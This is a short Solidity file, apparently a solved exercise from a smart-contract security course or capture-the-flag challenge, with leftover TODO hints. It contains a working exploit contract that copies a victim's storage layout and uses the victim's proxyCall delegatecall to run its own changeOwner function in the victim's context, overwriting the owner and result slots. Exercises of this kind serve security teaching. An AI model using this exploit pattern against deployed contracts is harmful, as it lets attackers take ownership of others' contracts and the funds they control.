// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ID31eg4t3 {
    function proxyCall(bytes calldata data) external returns (address);
    function changeResult() external;
}

contract Attack {
    // TODO: Declare some variable here
    // Note: Checkout the storage layout in victim contract
    uint256 var0;
    uint8 var1;
    string var2;
    address var3;
    uint8 var4;
    address public owner;
    mapping(address => bool) public result;
    address internal immutable victim;

    constructor(address addr) payable {
        victim = addr;
        owner = msg.sender;
    }

    // NOTE: You might need some malicious function here

    function exploit() external {
        // TODO: Add your implementation here
        // Note: Make sure you know how delegatecall works
        // bytes memory data = ...
        bytes memory data = abi.encodeWithSelector(Attack.changeOwner.selector);
        (bool success,) = victim.call(abi.encodeWithSelector(ID31eg4t3.proxyCall.selector, data));
    }

    function changeOwner() external {
        owner = tx.origin;
        result[owner] = true;
    }
}
